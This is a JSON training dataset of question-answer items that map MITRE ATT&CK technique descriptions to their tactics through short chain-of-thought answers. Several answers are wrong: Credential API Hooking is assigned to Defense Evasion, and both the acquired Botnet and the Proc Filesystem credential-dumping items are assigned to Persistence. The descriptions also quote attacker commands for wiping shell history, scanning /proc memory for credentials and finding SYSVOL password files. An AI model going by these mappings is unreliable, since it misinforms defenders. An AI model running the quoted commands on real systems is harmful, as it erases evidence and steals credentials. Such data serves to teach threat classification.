      "answer": "The given description is related to sub technique: Vulnerability Scanning (T1595.002);\nSub technique Vulnerability Scanning (T1595.002) is a type of technique Active Scanning (T1595);\nTechnique Active Scanning (T1595) is a type of tactic Reconnaissance (TA0043);\nTherefore, the given description is related to tactic Reconnaissance (TA0043).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may execute their own malicious payloads by hijacking the search order used to load DLLs. Windows systems use a common method to look for required DLLs to load into a program.  Hijacking DLL loads may be for the purpose of establishing persistence as well as elevating privileges and/or evading restrictions on file execution.\n\nThere are many ways an adversary can hijack DLL loads. Adversaries may plant trojan dynamic-link library files (DLLs) in a directory that will be searched before the location of a legitimate library that will be requested by a program, causing Windows to load their malicious library when it is called for by the victim program. Adversaries may also perform DLL preloading, also called binary planting attacks,  by placing a malicious DLL with the same name as an ambiguously specified DLL in a location that Windows searches before the legitimate DLL. Often this location is the current working directory of the program. Remote DLL preloading attacks occur when a program sets its current directory to a remote location such as a Web share before loading a DLL. \n\nPhantom DLL hijacking is a specific type of DLL search order hijacking where adversaries target references to non-existent DLL files. They may be able to load their own malicious DLL by planting it with the correct name in the location of the missing module.\n\nAdversaries may also directly modify the search order via DLL redirection, which after being enabled (in the Registry and creation of a redirection file) may cause a program to load a different DLL.\n\nIf a search order-vulnerable program is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation from user to administrator or SYSTEM or from administrator to SYSTEM, depending on the program. Programs that fall victim to path hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace.?",
    "context": "",
    "output": "The given description is related to sub technique DLL Search Order Hijacking (T1574.001);\nSub technique DLL Search Order Hijacking (T1574.001) is a type of technique Hijack Execution Flow (T1574);\nTechnique Hijack Execution Flow (T1574) is a type of tactic Persistence (TA0003);\nTherefore, the given description is related to tactic Persistence (TA0003).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may execute their own malicious payloads by hijacking the search order used to load DLLs. Windows systems use a common method to look for required DLLs to load into a program.  Hijacking DLL loads may be for the purpose of establishing persistence as well as elevating privileges and/or evading restrictions on file execution.\n\nThere are many ways an adversary can hijack DLL loads. Adversaries may plant trojan dynamic-link library files (DLLs) in a directory that will be searched before the location of a legitimate library that will be requested by a program, causing Windows to load their malicious library when it is called for by the victim program. Adversaries may also perform DLL preloading, also called binary planting attacks,  by placing a malicious DLL with the same name as an ambiguously specified DLL in a location that Windows searches before the legitimate DLL. Often this location is the current working directory of the program. Remote DLL preloading attacks occur when a program sets its current directory to a remote location such as a Web share before loading a DLL. \n\nPhantom DLL hijacking is a specific type of DLL search order hijacking where adversaries target references to non-existent DLL files. They may be able to load their own malicious DLL by planting it with the correct name in the location of the missing module.\n\nAdversaries may also directly modify the search order via DLL redirection, which after being enabled (in the Registry and creation of a redirection file) may cause a program to load a different DLL.\n\nIf a search order-vulnerable program is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation from user to administrator or SYSTEM or from administrator to SYSTEM, depending on the program. Programs that fall victim to path hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace.",
      "answer": "The given description is related to sub technique DLL Search Order Hijacking (T1574.001);\nSub technique DLL Search Order Hijacking (T1574.001) is a type of technique Hijack Execution Flow (T1574);\nTechnique Hijack Execution Flow (T1574) is a type of tactic Persistence (TA0003);\nTherefore, the given description is related to tactic Persistence (TA0003).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may compromise serverless cloud infrastructure, such as Cloudflare Workers or AWS Lambda functions, that can be used during targeting. By utilizing serverless infrastructure, adversaries can make it more difficult to attribute infrastructure used during operations back to them. \n\nOnce compromised, the serverless runtime environment can be leveraged to either respond directly to infected machines or to Proxy traffic to an adversary-owned command and control server. As traffic generated by these functions will appear to come from subdomains of common cloud providers, it may be difficult to distinguish from ordinary traffic to these providers.",
    "context": "",
    "output": "The given description is related to sub technique Serverless (T1584.007);\nSub technique Serverless (T1584.007) is a type of technique Compromise Infrastructure (T1584);\nTechnique Compromise Infrastructure (T1584) is a type of tactic Resource Development (TA0042);\nTherefore, the given description is related to tactic Resource Development (TA0042).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may compromise serverless cloud infrastructure, such as Cloudflare Workers or AWS Lambda functions, that can be used during targeting. By utilizing serverless infrastructure, adversaries can make it more difficult to attribute infrastructure used during operations back to them. \n\nOnce compromised, the serverless runtime environment can be leveraged to either respond directly to infected machines or to Proxy traffic to an adversary-owned command and control server. As traffic generated by these functions will appear to come from subdomains of common cloud providers, it may be difficult to distinguish from ordinary traffic to these providers.",
      "answer": "The given description is related to sub technique Serverless (T1584.007);\nSub technique Serverless (T1584.007) is a type of technique Compromise Infrastructure (T1584);\nTechnique Compromise Infrastructure (T1584) is a type of tactic Resource Development (TA0042);\nTherefore, the given description is related to tactic Resource Development (TA0042).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may compromise numerous third-party systems to form a botnet\u00a0that can be used during targeting. A botnet is a network of compromised systems that can be instructed to perform coordinated tasks. Instead of purchasing/renting a botnet from a booter/stresser service, adversaries may build their own botnet by compromising numerous third-party systems. Adversaries may also conduct a takeover of an existing botnet, such as redirecting bots to adversary-controlled C2 servers. With a botnet at their disposal, adversaries may perform follow-on activity such as large-scale Phishing or Distributed Denial of Service (DDoS).",
    "context": "",
    "output": "The given description is related to sub technique: Botnet (T1584.005);\nSub technique Botnet (T1584.005) is a type of technique Compromise Infrastructure (T1584);\nTechnique Compromise Infrastructure (T1584) is a type of tactic Resource Development (TA0042);\nTherefore, the given description is related to tactic Resource Development (TA0042).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may compromise numerous third-party systems to form a botnet\u00a0that can be used during targeting. A botnet is a network of compromised systems that can be instructed to perform coordinated tasks. Instead of purchasing/renting a botnet from a booter/stresser service, adversaries may build their own botnet by compromising numerous third-party systems. Adversaries may also conduct a takeover of an existing botnet, such as redirecting bots to adversary-controlled C2 servers. With a botnet at their disposal, adversaries may perform follow-on activity such as large-scale Phishing or Distributed Denial of Service (DDoS).",
      "answer": "The given description is related to sub technique: Botnet (T1584.005);\nSub technique Botnet (T1584.005) is a type of technique Compromise Infrastructure (T1584);\nTechnique Compromise Infrastructure (T1584) is a type of tactic Resource Development (TA0042);\nTherefore, the given description is related to tactic Resource Development (TA0042).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may hook into Windows application programming interface (API) functions to collect user credentials. Malicious hooking mechanisms may capture API calls that include parameters that reveal user authentication credentials. Unlike Keylogging,  this technique focuses specifically on API functions that include parameters that reveal user credentials. Hooking involves redirecting calls to these functions and can be implemented via:\n\n* **Hooks procedures**, which intercept and execute designated code in response to events such as messages, keystrokes, and mouse inputs.\n* **Import address table (IAT) hooking**, which use modifications to a process\u2019s IAT, where pointers to imported API functions are stored.\n* **Inline hooking**, which overwrites the first bytes in an API function to redirect code flow.",
    "context": "",
    "output": "The given description is related to sub technique: Credential API Hooking (T1056.004);\nSub technique Credential API Hooking (T1056.004) is a type of technique Input Capture (T1056);\nTechnique Input Capture (T1056) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may hook into Windows application programming interface (API) functions to collect user credentials. Malicious hooking mechanisms may capture API calls that include parameters that reveal user authentication credentials. Unlike Keylogging,  this technique focuses specifically on API functions that include parameters that reveal user credentials. Hooking involves redirecting calls to these functions and can be implemented via:\n\n* **Hooks procedures**, which intercept and execute designated code in response to events such as messages, keystrokes, and mouse inputs.\n* **Import address table (IAT) hooking**, which use modifications to a process\u2019s IAT, where pointers to imported API functions are stored.\n* **Inline hooking**, which overwrites the first bytes in an API function to redirect code flow.",
      "answer": "The given description is related to sub technique: Credential API Hooking (T1056.004);\nSub technique Credential API Hooking (T1056.004) is a type of technique Input Capture (T1056);\nTechnique Input Capture (T1056) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may use steganography techniques in order to prevent the detection of hidden information. Steganographic techniques can be used to hide data in digital media such as images, audio tracks, video clips, or text files.\n\nDuqu was an early example of malware that used steganography. It encrypted the gathered information from a victim's system and hid it within an image before exfiltrating the image to a C2 server. \n\nBy the end of 2017, a threat group used\u202f<code>Invoke-PSImage</code>\u202fto hide PowerShell commands in an image file (.png) and execute the code on a victim's system. In this particular case the PowerShell code downloaded another obfuscated script to gather intelligence from the victim's machine and communicate it back to the adversary.?",
    "context": "",
    "output": "The given description is related to sub technique Steganography (T1027.003);\nSub technique Steganography (T1027.003) is a type of technique Obfuscated Files or Information (T1027);\nTechnique Obfuscated Files or Information (T1027) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may use steganography techniques in order to prevent the detection of hidden information. Steganographic techniques can be used to hide data in digital media such as images, audio tracks, video clips, or text files.\n\nDuqu was an early example of malware that used steganography. It encrypted the gathered information from a victim's system and hid it within an image before exfiltrating the image to a C2 server. \n\nBy the end of 2017, a threat group used\u202f<code>Invoke-PSImage</code>\u202fto hide PowerShell commands in an image file (.png) and execute the code on a victim's system. In this particular case the PowerShell code downloaded another obfuscated script to gather intelligence from the victim's machine and communicate it back to the adversary.",
      "answer": "The given description is related to sub technique Steganography (T1027.003);\nSub technique Steganography (T1027.003) is a type of technique Obfuscated Files or Information (T1027);\nTechnique Obfuscated Files or Information (T1027) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may abuse resource forks to hide malicious code or executables to evade detection and bypass security applications. A resource fork provides applications a structured way to store resources such as thumbnail images, menu definitions, icons, dialog boxes, and code. Usage of a resource fork is identifiable when displaying a file\u2019s extended attributes, using <code>ls -l@</code> or <code>xattr -l</code> commands. Resource forks have been deprecated and replaced with the application bundle structure. Non-localized resources are placed at the top level directory of an application bundle, while localized resources are placed in the <code>/Resources</code> folder.\n\nAdversaries can use resource forks to hide malicious data that may otherwise be stored directly in files. Adversaries can execute content with an attached resource fork, at a specified offset, that is moved to an executable location then invoked. Resource fork content may also be obfuscated/encrypted until execution.?",
    "context": "",
    "output": "The given description is related to sub technique Resource Forking (T1564.009);\nSub technique Resource Forking (T1564.009) is a type of technique Hide Artifacts (T1564);\nTechnique Hide Artifacts (T1564) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may abuse resource forks to hide malicious code or executables to evade detection and bypass security applications. A resource fork provides applications a structured way to store resources such as thumbnail images, menu definitions, icons, dialog boxes, and code. Usage of a resource fork is identifiable when displaying a file\u2019s extended attributes, using <code>ls -l@</code> or <code>xattr -l</code> commands. Resource forks have been deprecated and replaced with the application bundle structure. Non-localized resources are placed at the top level directory of an application bundle, while localized resources are placed in the <code>/Resources</code> folder.\n\nAdversaries can use resource forks to hide malicious data that may otherwise be stored directly in files. Adversaries can execute content with an attached resource fork, at a specified offset, that is moved to an executable location then invoked. Resource fork content may also be obfuscated/encrypted until execution.",
      "answer": "The given description is related to sub technique Resource Forking (T1564.009);\nSub technique Resource Forking (T1564.009) is a type of technique Hide Artifacts (T1564);\nTechnique Hide Artifacts (T1564) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nIn addition to clearing system logs, an adversary may clear the command history of a compromised account to conceal the actions undertaken during an intrusion. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done.\n\nOn Linux and macOS, these command histories can be accessed in a few different ways. While logged in, this command history is tracked in a file pointed to by the environment variable <code>HISTFILE</code>. When a user logs off a system, this information is flushed to a file in the user's home directory called <code>~/.bash_history</code>. The benefit of this is that it allows users to go back to commands they've used before in different sessions.\n\nAdversaries may delete their commands from these logs by manually clearing the history (<code>history -c</code>) or deleting the bash history file <code>rm ~/.bash_history</code>.  \n\nAdversaries may also leverage a Network Device CLI on network devices to clear command history data (<code>clear logging</code> and/or <code>clear history</code>).\n\nOn Windows hosts, PowerShell has two different command history providers: the built-in history and the command history managed by the <code>PSReadLine</code> module. The built-in history only tracks the commands used in the current session. This command history is not available to other sessions and is deleted when the session ends.\n\nThe <code>PSReadLine</code> command history tracks the commands used in all PowerShell sessions and writes them to a file (<code>$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt</code> by default). This history file is available to all sessions and contains all past history since the file is not deleted when the session ends.\n\nAdversaries may run the PowerShell command <code>Clear-History</code> to flush the entire command history from a current PowerShell session. This, however, will not delete/flush the <code>ConsoleHost_history.txt</code> file. Adversaries may also delete the <code>ConsoleHost_history.txt</code> file or edit its contents to hide PowerShell commands they have run.",
    "context": "",
    "output": "The given description is related to sub technique: Clear Command History (T1070.003);\nSub technique Clear Command History (T1070.003) is a type of technique Indicator Removal (T1070);\nTechnique Indicator Removal (T1070) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nIn addition to clearing system logs, an adversary may clear the command history of a compromised account to conceal the actions undertaken during an intrusion. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done.\n\nOn Linux and macOS, these command histories can be accessed in a few different ways. While logged in, this command history is tracked in a file pointed to by the environment variable <code>HISTFILE</code>. When a user logs off a system, this information is flushed to a file in the user's home directory called <code>~/.bash_history</code>. The benefit of this is that it allows users to go back to commands they've used before in different sessions.\n\nAdversaries may delete their commands from these logs by manually clearing the history (<code>history -c</code>) or deleting the bash history file <code>rm ~/.bash_history</code>.  \n\nAdversaries may also leverage a Network Device CLI on network devices to clear command history data (<code>clear logging</code> and/or <code>clear history</code>).\n\nOn Windows hosts, PowerShell has two different command history providers: the built-in history and the command history managed by the <code>PSReadLine</code> module. The built-in history only tracks the commands used in the current session. This command history is not available to other sessions and is deleted when the session ends.\n\nThe <code>PSReadLine</code> command history tracks the commands used in all PowerShell sessions and writes them to a file (<code>$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt</code> by default). This history file is available to all sessions and contains all past history since the file is not deleted when the session ends.\n\nAdversaries may run the PowerShell command <code>Clear-History</code> to flush the entire command history from a current PowerShell session. This, however, will not delete/flush the <code>ConsoleHost_history.txt</code> file. Adversaries may also delete the <code>ConsoleHost_history.txt</code> file or edit its contents to hide PowerShell commands they have run.",
      "answer": "The given description is related to sub technique: Clear Command History (T1070.003);\nSub technique Clear Command History (T1070.003) is a type of technique Indicator Removal (T1070);\nTechnique Indicator Removal (T1070) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may send spearphishing messages via third-party services in an attempt to gain access to victim systems. Spearphishing via service is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of third party services rather than directly via enterprise email channels. \n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries send messages through various social media services, personal webmail, and other non-enterprise controlled services. These services are more likely to have a less-strict security policy than an enterprise. As with most kinds of spearphishing, the goal is to generate rapport with the target or get the target's interest in some way. Adversaries will create fake social media accounts and message employees for potential job opportunities. Doing so allows a plausible reason for asking about services, policies, and software that's running in an environment. The adversary can then send malicious links or attachments through these services.\n\nA common example is to build rapport with a target via social media, then send content to a personal webmail service that the target uses on their work computer. This allows an adversary to bypass some email restrictions on the work account, and the target is more likely to open the file since it's something they were expecting. If the payload doesn't work as expected, the adversary can continue normal communications and troubleshoot with the target on how to get it working.?",
    "context": "",
    "output": "The given description is related to sub technique: Spearphishing via Service (T1566.003);\nSub technique Spearphishing via Service (T1566.003) is a type of technique Phishing (T1566);\nTechnique Phishing (T1566) is a type of tactic Initial Access (TA0001);\nTherefore, the given description is related to tactic Initial Access (TA0001).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may send spearphishing messages via third-party services in an attempt to gain access to victim systems. Spearphishing via service is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of third party services rather than directly via enterprise email channels. \n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries send messages through various social media services, personal webmail, and other non-enterprise controlled services. These services are more likely to have a less-strict security policy than an enterprise. As with most kinds of spearphishing, the goal is to generate rapport with the target or get the target's interest in some way. Adversaries will create fake social media accounts and message employees for potential job opportunities. Doing so allows a plausible reason for asking about services, policies, and software that's running in an environment. The adversary can then send malicious links or attachments through these services.\n\nA common example is to build rapport with a target via social media, then send content to a personal webmail service that the target uses on their work computer. This allows an adversary to bypass some email restrictions on the work account, and the target is more likely to open the file since it's something they were expecting. If the payload doesn't work as expected, the adversary can continue normal communications and troubleshoot with the target on how to get it working.",
      "answer": "The given description is related to sub technique: Spearphishing via Service (T1566.003);\nSub technique Spearphishing via Service (T1566.003) is a type of technique Phishing (T1566);\nTechnique Phishing (T1566) is a type of tactic Initial Access (TA0001);\nTherefore, the given description is related to tactic Initial Access (TA0001).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - An adversary may delete a cloud instance after they have performed malicious activities in an attempt to evade detection and remove evidence of their presence.  Deleting an instance or virtual machine can remove valuable forensic artifacts and other evidence of suspicious behavior if the instance is not recoverable.\n\nAn adversary may also Create Cloud Instance and later terminate the instance after achieving their objectives.?",
    "context": "",
    "output": "The given description is related to sub technique Delete Cloud Instance (T1578.003);\nSub technique Delete Cloud Instance (T1578.003) is a type of technique Modify Cloud Compute Infrastructure (T1578);\nTechnique Modify Cloud Compute Infrastructure (T1578) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - An adversary may delete a cloud instance after they have performed malicious activities in an attempt to evade detection and remove evidence of their presence.  Deleting an instance or virtual machine can remove valuable forensic artifacts and other evidence of suspicious behavior if the instance is not recoverable.\n\nAn adversary may also Create Cloud Instance and later terminate the instance after achieving their objectives.",
      "answer": "The given description is related to sub technique Delete Cloud Instance (T1578.003);\nSub technique Delete Cloud Instance (T1578.003) is a type of technique Modify Cloud Compute Infrastructure (T1578);\nTechnique Modify Cloud Compute Infrastructure (T1578) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may insert, delete, or manipulate data at rest in order to influence external outcomes or hide activity, thus threatening the integrity of the data. By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making.\n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
    "context": "",
    "output": "The given description is related to sub technique: Stored Data Manipulation (T1565.001);\nSub technique Stored Data Manipulation (T1565.001) is a type of technique Data Manipulation (T1565);\nTechnique Data Manipulation (T1565) is a type of tactic Impact (TA0040);\nTherefore, the given description is related to tactic Impact (TA0040).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may insert, delete, or manipulate data at rest in order to influence external outcomes or hide activity, thus threatening the integrity of the data. By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making.\n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
      "answer": "The given description is related to sub technique: Stored Data Manipulation (T1565.001);\nSub technique Stored Data Manipulation (T1565.001) is a type of technique Data Manipulation (T1565);\nTechnique Data Manipulation (T1565) is a type of tactic Impact (TA0040);\nTherefore, the given description is related to tactic Impact (TA0040).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries with SYSTEM access to a host may attempt to access Local Security Authority (LSA) secrets, which can contain a variety of different credential materials, such as credentials for service accounts. LSA secrets are stored in the registry at <code>HKEY_LOCAL_MACHINE\\SECURITY\\Policy\\Secrets</code>. LSA secrets can also be dumped from memory.\n\nReg can be used to extract from the Registry. Mimikatz can be used to extract secrets from memory.",
    "context": "",
    "output": "The given description is related to sub technique: LSA Secrets (T1003.004);\nSub technique LSA Secrets (T1003.004) is a type of technique OS Credential Dumping (T1003);\nTechnique OS Credential Dumping (T1003) is a type of tactic Credential Access (TA0006);\nTherefore, the given description is related to tactic Credential Access (TA0006).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries with SYSTEM access to a host may attempt to access Local Security Authority (LSA) secrets, which can contain a variety of different credential materials, such as credentials for service accounts. LSA secrets are stored in the registry at <code>HKEY_LOCAL_MACHINE\\SECURITY\\Policy\\Secrets</code>. LSA secrets can also be dumped from memory.\n\nReg can be used to extract from the Registry. Mimikatz can be used to extract secrets from memory.",
      "answer": "The given description is related to sub technique: LSA Secrets (T1003.004);\nSub technique LSA Secrets (T1003.004) is a type of technique OS Credential Dumping (T1003);\nTechnique OS Credential Dumping (T1003) is a type of tactic Credential Access (TA0006);\nTherefore, the given description is related to tactic Credential Access (TA0006).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may buy, lease, or rent a network of compromised systems\u00a0that can be used during targeting. A botnet is a network of compromised systems that can be instructed to perform coordinated tasks. Adversaries may purchase a subscription to use an existing botnet from a booter/stresser service. With a botnet at their disposal, adversaries may perform follow-on activity such as large-scale Phishing or Distributed Denial of Service (DDoS).?",
    "context": "",
    "output": "The given description is related to sub technique: Botnet (T1583.005);\nSub technique Botnet (T1583.005) is a type of technique Acquire Infrastructure (T1583);\nTechnique Acquire Infrastructure (T1583) is a type of tactic Persistence (TA0003);\nTherefore, the given description is related to tactic Persistence (TA0003).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may buy, lease, or rent a network of compromised systems\u00a0that can be used during targeting. A botnet is a network of compromised systems that can be instructed to perform coordinated tasks. Adversaries may purchase a subscription to use an existing botnet from a booter/stresser service. With a botnet at their disposal, adversaries may perform follow-on activity such as large-scale Phishing or Distributed Denial of Service (DDoS).",
      "answer": "The given description is related to sub technique: Botnet (T1583.005);\nSub technique Botnet (T1583.005) is a type of technique Acquire Infrastructure (T1583);\nTechnique Acquire Infrastructure (T1583) is a type of tactic Persistence (TA0003);\nTherefore, the given description is related to tactic Persistence (TA0003).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may attempt to find unsecured credentials in Group Policy Preferences (GPP). GPP are tools that allow administrators to create domain policies with embedded credentials. These policies allow administrators to set local accounts.\n\nThese group policies are stored in SYSVOL on a domain controller. This means that any domain user can view the SYSVOL share and decrypt the password (using the AES key that has been made public).\n\nThe following tools and scripts can be used to gather and decrypt the password file from Group Policy Preference XML files:\n\n* Metasploit\u2019s post exploitation module: <code>post/windows/gather/credentials/gpp</code>\n* Get-GPPPassword\n* gpprefdecrypt.py\n\nOn the SYSVOL share, adversaries may use the following command to enumerate potential GPP XML files: <code>dir /s * .xml</code>?",
    "context": "",
    "output": "The given description is related to sub technique Group Policy Preferences (T1552.006);\nSub technique Group Policy Preferences (T1552.006) is a type of technique Unsecured Credentials (T1552);\nTechnique Unsecured Credentials (T1552) is a type of tactic Credential Access (TA0006);\nTherefore, the given description is related to tactic Credential Access (TA0006).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may attempt to find unsecured credentials in Group Policy Preferences (GPP). GPP are tools that allow administrators to create domain policies with embedded credentials. These policies allow administrators to set local accounts.\n\nThese group policies are stored in SYSVOL on a domain controller. This means that any domain user can view the SYSVOL share and decrypt the password (using the AES key that has been made public).\n\nThe following tools and scripts can be used to gather and decrypt the password file from Group Policy Preference XML files:\n\n* Metasploit\u2019s post exploitation module: <code>post/windows/gather/credentials/gpp</code>\n* Get-GPPPassword\n* gpprefdecrypt.py\n\nOn the SYSVOL share, adversaries may use the following command to enumerate potential GPP XML files: <code>dir /s * .xml</code>",
      "answer": "The given description is related to sub technique Group Policy Preferences (T1552.006);\nSub technique Group Policy Preferences (T1552.006) is a type of technique Unsecured Credentials (T1552);\nTechnique Unsecured Credentials (T1552) is a type of tactic Credential Access (TA0006);\nTherefore, the given description is related to tactic Credential Access (TA0006).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may gather credentials from the proc filesystem or `/proc`. The proc filesystem is a pseudo-filesystem used as an interface to kernel data structures for Linux based systems managing virtual memory. For each process, the `/proc/<PID>/maps` file shows how memory is mapped within the process\u2019s virtual address space. And `/proc/<PID>/mem`, exposed for debugging purposes, provides access to the process\u2019s virtual address space.\n\nWhen executing with root privileges, adversaries can search these memory locations for all processes on a system that contain patterns indicative of credentials. Adversaries may use regex patterns, such as <code>grep -E \"^0-9a-f-* r\" /proc/\"$pid\"/maps | cut -d' ' -f 1</code>, to look for fixed strings in memory structures or cached hashes. When running without privileged access, processes can still view their own virtual memory locations. Some services or programs may save credentials in clear text inside the process\u2019s memory.\n\nIf running as or with the permissions of a web browser, a process can search the `/maps` & `/mem` locations for common website credential patterns (that can also be used to find adjacent memory within the same structure) in which hashes or cleartext credentials may be located.?",
    "context": "",
    "output": "The given description is related to sub technique Proc Filesystem (T1003.007);\nSub technique Proc Filesystem (T1003.007) is a type of technique OS Credential Dumping (T1003);\nTechnique OS Credential Dumping (T1003) is a type of tactic Persistence (TA0003);\nTherefore, the given description is related to tactic Persistence (TA0003).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may gather credentials from the proc filesystem or `/proc`. The proc filesystem is a pseudo-filesystem used as an interface to kernel data structures for Linux based systems managing virtual memory. For each process, the `/proc/<PID>/maps` file shows how memory is mapped within the process\u2019s virtual address space. And `/proc/<PID>/mem`, exposed for debugging purposes, provides access to the process\u2019s virtual address space.\n\nWhen executing with root privileges, adversaries can search these memory locations for all processes on a system that contain patterns indicative of credentials. Adversaries may use regex patterns, such as <code>grep -E \"^0-9a-f-* r\" /proc/\"$pid\"/maps | cut -d' ' -f 1</code>, to look for fixed strings in memory structures or cached hashes. When running without privileged access, processes can still view their own virtual memory locations. Some services or programs may save credentials in clear text inside the process\u2019s memory.\n\nIf running as or with the permissions of a web browser, a process can search the `/maps` & `/mem` locations for common website credential patterns (that can also be used to find adjacent memory within the same structure) in which hashes or cleartext credentials may be located.",
      "answer": "The given description is related to sub technique Proc Filesystem (T1003.007);\nSub technique Proc Filesystem (T1003.007) is a type of technique OS Credential Dumping (T1003);\nTechnique OS Credential Dumping (T1003) is a type of tactic Persistence (TA0003);\nTherefore, the given description is related to tactic Persistence (TA0003).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
